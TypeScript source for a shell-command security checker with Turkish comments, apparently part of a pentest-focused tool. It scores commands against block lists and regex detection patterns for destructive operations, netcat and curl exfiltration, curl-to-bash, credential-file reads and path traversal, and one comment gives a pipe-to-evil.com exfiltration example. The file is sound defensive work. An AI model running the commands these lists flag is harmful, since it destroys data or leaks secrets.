/**
 * @fileoverview SETH Shell Güvenlik Denetleyicisi — v3.9.6
 * Claude Code bash-parser'dan ilham alınmış, Seth'in CTF/pentest odağına uygun
 * hafif ve etkili shell komut güvenlik analizörü.
 * AGPL-3.0
 *
 * Özellikler:
 * - Tehlikeli komut desenlerini tespit
 * - Pipe chain analizi
 * - Redirection güvenlik kontrolü
 * - Path saldırı tespiti
 * - Komut bazlı kara liste
 * - AST benzeri yapı (full parser yerine regex+mantık)
 */

// ---------------------------------------------------------------------------
// Tipler
// ---------------------------------------------------------------------------

export interface ShellCommandAnalysis {
  /** Komut güvenli mi? */
  safe: boolean;
  /** Engelleyici mi yoksa uyarı mı? */
  severity: 'block' | 'warn' | 'info';
  /** Tespit edilen tehlikeli yapılar */
  findings: ShellFinding[];
  /** Ayrıştırılmış komut yapısı */
  parsed: ParsedShell;
}

export interface ShellFinding {
  type: FindingType;
  message: string;
  detail: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  position?: { start: number; end: number };
}

export type FindingType =
  | 'dangerous_command'
  | 'dangerous_flag'
  | 'destructive_operation'
  | 'data_exfiltration'
  | 'suspicious_redirection'
  | 'command_injection'
  | 'path_traversal'
  | 'network_exfiltration'
  | 'permission_escalation'
  | 'encoded_payload';

export interface ParsedShell {
  /** Ana komut */
  command: string;
  /** Argümanlar */
  args: string[];
  /** Pipe chain (birden çok komut) */
  pipeline: ParsedShell[];
  /** Yönlendirmeler */
  redirects: Array<{ type: string; target: string }>;
  /** Ortam değişkeni atamaları */
  envVars: Array<{ key: string; value: string }>;
  /** Zincirleme operatörü (&&, ||, ;) */
  operator?: '&&' | '||' | ';' | '|';
  /** Alt kabuk mu? ($(...) veya `...`) */
  hasSubshell: boolean;
}

// ---------------------------------------------------------------------------
// Tehlikeli Komutlar
// ---------------------------------------------------------------------------

const DANGEROUS_COMMANDS: Record<string, { severity: FindingType; risk: 'critical' | 'high' | 'medium'; description: string }> = {
  'rm': { severity: 'destructive_operation', risk: 'critical', description: 'Dosya/silinme işlemi' },
  'dd': { severity: 'destructive_operation', risk: 'critical', description: 'Doğrudan disk yazma' },
  'mkfs': { severity: 'destructive_operation', risk: 'critical', description: 'Dosya sistemi oluşturma' },
  'fdisk': { severity: 'destructive_operation', risk: 'critical', description: 'Disk bölümleme' },
  'format': { severity: 'destructive_operation', risk: 'critical', description: 'Disk biçimlendirme' },
  'mkswap': { severity: 'destructive_operation', risk: 'critical', description: 'Swap oluşturma' },
  'shutdown': { severity: 'destructive_operation', risk: 'critical', description: 'Sistemi kapatma' },
  'reboot': { severity: 'destructive_operation', risk: 'critical', description: 'Sistemi yeniden başlatma' },
  'poweroff': { severity: 'destructive_operation', risk: 'critical', description: 'Sistemi kapatma' },
  'init': { severity: 'permission_escalation', risk: 'critical', description: 'init/sysv yönetimi' },
  'halt': { severity: 'destructive_operation', risk: 'critical', description: 'Sistemi durdurma' },
  'chmod': { severity: 'permission_escalation', risk: 'high', description: 'İzin değiştirme' },
  'chown': { severity: 'permission_escalation', risk: 'high', description: 'Sahipik değiştirme' },
  'sudo': { severity: 'permission_escalation', risk: 'high', description: 'Yetki yükseltme' },
  'su': { severity: 'permission_escalation', risk: 'high', description: 'Kullanıcı değiştirme' },
  'passwd': { severity: 'permission_escalation', risk: 'high', description: 'Şifre değiştirme' },
  'usermod': { severity: 'permission_escalation', risk: 'high', description: 'Kullanıcı değiştirme' },
  'curl': { severity: 'network_exfiltration', risk: 'medium', description: 'HTTP isteği' },
  'wget': { severity: 'network_exfiltration', risk: 'medium', description: 'HTTP indirme' },
  'nc': { severity: 'network_exfiltration', risk: 'high', description: 'Ağ bağlantısı' },
  'ncat': { severity: 'network_exfiltration', risk: 'high', description: 'Ağ bağlantısı' },
  'socat': { severity: 'network_exfiltration', risk: 'high', description: 'Ağ bağlantısı' },
  'telnet': { severity: 'network_exfiltration', risk: 'medium', description: 'Uzak bağlantı' },
  'ssh': { severity: 'network_exfiltration', risk: 'medium', description: 'Uzak bağlantı' },
  'scp': { severity: 'data_exfiltration', risk: 'high', description: 'Dosya aktarımı' },
  'rsync': { severity: 'data_exfiltration', risk: 'high', description: 'Dosya senkronizasyonu' },
  'eval': { severity: 'command_injection', risk: 'critical', description: 'Kod çalıştırma' },
  'base64': { severity: 'encoded_payload', risk: 'medium', description: 'Base64 encode/decode' },
  'openssl': { severity: 'encoded_payload', risk: 'medium', description: 'Şifreleme aracı' },
};

// Tehlikeli flag kombinasyonları
const DANGEROUS_FLAGS: Record<string, Array<{ flags: string[]; risk: string; description: string }>> = {
  'rm': [
    { flags: ['-rf', '-fr', '-r -f', '-f -r'], risk: 'critical', description: 'Force recursive silme' },
    { flags: ['--no-preserve-root'], risk: 'critical', description: 'Kök korumasız silme' },
  ],
  'chmod': [
    { flags: ['-R', '--recursive'], risk: 'high', description: 'Recursive izin değişikliği' },
    { flags: ['777', 'a+rwx', 'a+x'], risk: 'high', description: 'Herkes için tam izin' },
  ],
  'dd': [
    { flags: ['if=/dev/zero', 'if=/dev/random'], risk: 'critical', description: 'Disk sıfırlama' },
    { flags: ['of=/dev/sda', 'of=/dev/hda'], risk: 'critical', description: 'Disk üzerine yazma' },
  ],
  'curl': [
    { flags: ['-o', '-O', '--output'], risk: 'medium', description: 'Dosya indirme' },
    { flags: ['bash', 'sh'], risk: 'critical', description: 'Pipe ile shell çalıştırma' },
  ],
};

// Veri sızdırma desenleri
const DATA_EXFIL_PATTERNS = [
  /(\/etc\/passwd|\/etc\/shadow|\/etc\/hosts|\/proc\/|\/sys\/)/i,
  /(cat|tac|nl)\s+.*\|\s*(curl|wget|nc|ncat)/i,
  /(curl|wget)\s+.*\s*--data\s*(@|'|")/i,
  /(grep|awk|sed)\s+.*\s+(key|secret|token|password|api_key|auth)/i,
];

const PATH_TRAVERSAL_PATTERNS = [
  /\.\.\/\.\.\//,
  /\.\.\\\.\.\\/,
  /\/\.\.\//,
];

// ---------------------------------------------------------------------------
// Ana Analiz Fonksiyonu
// ---------------------------------------------------------------------------

export function analyzeShellCommand(input: string): ShellCommandAnalysis {
  const findings: ShellFinding[] = [];
  const trimmed = input.trim();

  //boş komut
  if (!trimmed) {
    return {
      safe: true,
      severity: 'info',
      findings: [],
      parsed: { command: '', args: [], pipeline: [], redirects: [], envVars: [], hasSubshell: false },
    };
  }

  const parsed = parseShellCommand(trimmed);
  let severity: 'block' | 'warn' | 'info' = 'info';

  // 1. Pipe chain analizi
  if (parsed.pipeline.length > 1) {
    for (let i = 0; i < parsed.pipeline.length; i++) {
      const cmd = parsed.pipeline[i];
      const cmdFindings = analyzeSingleCommand(cmd.command, cmd.args);
      findings.push(...cmdFindings);

      // Pipe ile veri sızdırma (cat file | nc evil.com)
      if (i < parsed.pipeline.length - 1) {
        const nextCmd = parsed.pipeline[i + 1];
        if (isNetworkCommand(nextCmd.command) && !isNetworkCommand(cmd.command)) {
          findings.push({
            type: 'data_exfiltration',
            message: 'Potansiyel veri sızdırma',
            detail: `"${cmd.command}" çıktısı "${nextCmd.command}" ile ağa gönderiliyor`,
            severity: 'critical',
          });
        }
        // curl | bash tespiti
        if (cmd.command === 'curl' && (nextCmd.command === 'bash' || nextCmd.command === 'sh')) {
          findings.push({
            type: 'command_injection',
            message: 'curl|bash — uzaktan kod çalıştırma',
            detail: 'İnternetten indirilen kod doğrudan çalıştırılıyor',
            severity: 'critical',
          });
        }
      }
    }
  } else {
    // Tek komut
    const cmdFindings = analyzeSingleCommand(parsed.command, parsed.args);
    findings.push(...cmdFindings);
  }

  // 2. Yönlendirme analizi
  for (const redir of parsed.redirects) {
    if (redir.target.startsWith('/dev/')) {
      findings.push({
        type: 'suspicious_redirection',
        message: 'Cihaz dosyasına yönlendirme',
        detail: `Çıktı "${redir.target}" cihazına yönlendiriliyor`,
        severity: 'high',
      });
    }
  }

  // 3. Alt kabuk kontrolü
  if (parsed.hasSubshell) {
    findings.push({
      type: 'command_injection',
      message: 'Alt kabuk kullanımı',
      detail: 'Komut $() veya `` ile alt kabuk çalıştırıyor',
      severity: 'medium',
    });
  }

  // 4. Veri sızdırma desenleri
  for (const pattern of DATA_EXFIL_PATTERNS) {
    const match = trimmed.match(pattern);
    if (match) {
      findings.push({
        type: 'data_exfiltration',
        message: 'Potansiyel hassas veri erişimi',
        detail: `Desen eşleşti: "${match[0].slice(0, 80)}"`,
        severity: 'high',
      });
    }
  }

  // 5. Path traversal
  for (const pattern of PATH_TRAVERSAL_PATTERNS) {
    if (pattern.test(trimmed)) {
      findings.push({
        type: 'path_traversal',
        message: 'Path traversal saldırısı',
        detail: 'Dizin yükseltme (../) tespit edildi',
        severity: 'high',
      });
    }
  }

  // 6. Kodlanmış payload
  const base64Cmds = trimmed.match(/(echo|base64)\s+[A-Za-z0-9+/]{50,}={0,2}\s*\|/i);
  if (base64Cmds) {
    findings.push({
      type: 'encoded_payload',
      message: 'Base64 kodlanmış payload',
      detail: 'Base64 ile kodlanmış komut tespit edildi',
      severity: 'high',
    });
  }

  // Overall severity
  if (findings.some(f => f.severity === 'critical')) severity = 'block';
  else if (findings.some(f => f.severity === 'high')) severity = 'block';
  else if (findings.length > 0) severity = 'warn';

  return {
    safe: severity !== 'block',
    severity,
    findings,
    parsed,
  };
}

// ---------------------------------------------------------------------------
// Tekil Komut Analizi
// ---------------------------------------------------------------------------

function analyzeSingleCommand(command: string, args: string[]): ShellFinding[] {
  const findings: ShellFinding[] = [];
  const cmdLower = command.toLowerCase();

  // 1. Tehlikeli komut mu?
  const dangerEntry = DANGEROUS_COMMANDS[cmdLower];
  if (dangerEntry) {
    findings.push({
      type: dangerEntry.severity,
      message: `Tehlikeli komut: ${cmdLower}`,
      detail: `${dangerEntry.description} — ${cmdLower}`,
      severity: dangerEntry.risk,
    });
  }

  // 2. Tehlikeli flag kombinasyonu var mı?
  const flagEntry = DANGEROUS_FLAGS[cmdLower];
  if (flagEntry) {
    const argStr = args.join(' ').toLowerCase();
    for (const entry of flagEntry) {
      for (const flag of entry.flags) {
        if (argStr.includes(flag)) {
          const risk = entry.risk as 'critical' | 'high' | 'medium';
          findings.push({
            type: 'dangerous_flag',
            message: `Tehlikeli flag: ${flag}`,
            detail: `${entry.description} (${cmdLower} ${flag})`,
            severity: risk,
          });
        }
      }
    }
  }

  // 3. Hedef path'te kritik dizin var mı?
  for (const arg of args) {
    if (arg === '/' || arg === '/home' || arg === '/etc' || arg === '/var' || arg === '/usr') {
      findings.push({
        type: 'dangerous_flag',
        message: 'Kritik dizin hedefi',
        detail: `Kök/kritik dizin hedefleniyor: "${arg}"`,
        severity: 'critical',
      });
    }
  }

  return findings;
}

// ---------------------------------------------------------------------------
// Bash Komut Ayrıştırıcı (Hafif)
// ---------------------------------------------------------------------------

function parseShellCommand(input: string): ParsedShell {
  const result: ParsedShell = {
    command: '',
    args: [],
    pipeline: [],
    redirects: [],
    envVars: [],
    hasSubshell: false,
  };

  // Alt kabuk kontrolü
  result.hasSubshell = /\$\(|`/.test(input);

  // Ortam değişkeni atamalarını çıkar
  let cleaned = input;
  const envAssignRe = /^([A-Za-z_]\w*)=(?:"([^"]*)"|'([^']*)'|(\S+))\s*/;
  let match: RegExpExecArray | null;
  while ((match = envAssignRe.exec(cleaned)) !== null) {
    result.envVars.push({ key: match[1], value: match[2] || match[3] || match[4] || '' });
    cleaned = cleaned.slice(match[0].length);
  }

  // Yönlendirmeleri çıkar
  const redirRe = /(\d?[<>]{1,2})\s*(\S+)/g;
  while ((match = redirRe.exec(cleaned)) !== null) {
    result.redirects.push({ type: match[1], target: match[2] });
  }

  // Pipe'a böl
  const pipeParts = splitByOperator(cleaned);

  for (const part of pipeParts) {
    const trimmed = part.trim();
    if (!trimmed) continue;

    // Operatörü belirle
    if (trimmed.startsWith('&&')) {
      result.operator = '&&';
      continue;
    }
    if (trimmed.startsWith('||')) {
      result.operator = '||';
      continue;
    }
    if (trimmed.startsWith(';')) {
      result.operator = ';';
      continue;
    }

    // Komut ve argümanları ayır
    const tokens = tokenize(trimmed);
    if (tokens.length > 0) {
      const cmd = tokens[0];
      const args = tokens.slice(1);
      result.pipeline.push({ command: cmd, args, pipeline: [], redirects: [], envVars: [], hasSubshell: false });
    }
  }

  // Ana komut
  if (result.pipeline.length > 0) {
    result.command = result.pipeline[0].command;
    result.args = result.pipeline[0].args;
  }

  return result;
}

// ---------------------------------------------------------------------------
// Yardımcılar
// ---------------------------------------------------------------------------

function splitByOperator(input: string): string[] {
  // Pipe, &&, || ve ; operatörlerine göre ayır
  const parts: string[] = [];
  let current = '';
  let inQuote: string | null = null;
  let escape = false;

  for (let i = 0; i < input.length; i++) {
    const c = input[i];

    if (escape) {
      current += c;
      escape = false;
      continue;
    }

    if (c === '\\') {
      current += c;
      escape = true;
      continue;
    }

    if (inQuote) {
      current += c;
      if (c === inQuote) inQuote = null;
      continue;
    }

    if (c === '"' || c === "'") {
      current += c;
      inQuote = c;
      continue;
    }

    if (c === '|' && input[i + 1] !== '|') {
      parts.push(current.trim());
      current = '';
      continue;
    }

    if (c === '&' && input[i + 1] === '&') {
      parts.push(current.trim(), '&&');
      current = '';
      i++; // skip second &
      continue;
    }

    if (c === '|' && input[i + 1] === '|') {
      parts.push(current.trim(), '||');
      current = '';
      i++;
      continue;
    }

    if (c === ';') {
      parts.push(current.trim(), ';');
      current = '';
      continue;
    }

    current += c;
  }

  if (current.trim()) parts.push(current.trim());
  return parts;
}

function tokenize(input: string): string[] {
  const tokens: string[] = [];
  let current = '';
  let inQuote: string | null = null;
  let escape = false;

  for (let i = 0; i < input.length; i++) {
    const c = input[i];

    if (escape) {
      current += c;
      escape = false;
      continue;
    }

    if (c === '\\') {
      current += c;
      escape = true;
      continue;
    }

    if (inQuote) {
      current += c;
      if (c === inQuote) inQuote = null;
      continue;
    }

    if (c === '"' || c === "'") {
      current += c;
      inQuote = c;
      continue;
    }

    if (c === ' ' || c === '\t') {
      if (current.trim()) {
        tokens.push(current.trim());
        current = '';
      }
      continue;
    }

    current += c;
  }

  if (current.trim()) tokens.push(current.trim());
  return tokens;
}

function isNetworkCommand(cmd: string): boolean {
  return ['curl', 'wget', 'nc', 'ncat', 'socat', 'telnet', 'ssh', 'scp', 'rsync'].includes(cmd.toLowerCase());
}

// ---------------------------------------------------------------------------
// Toplu Güvenlik Raporu
// ---------------------------------------------------------------------------

export function formatSecurityReport(analysis: ShellCommandAnalysis): string {
  if (analysis.findings.length === 0) return '';

  const lines: string[] = [];
  lines.push('╔═══ Shell Güvenlik Analizi ═══╗');

  for (const finding of analysis.findings) {
    const icon = finding.severity === 'critical' ? '🔴' : finding.severity === 'high' ? '🟡' : '🟢';
    lines.push(`${icon} [${finding.type}] ${finding.message}`);
    lines.push(`  ${finding.detail}`);
  }

  lines.push(`╚═══ Durum: ${analysis.safe ? '✅ Güvenli' : '⛔ Müdahale Gerekli'}`);
  return lines.join('\n');
}
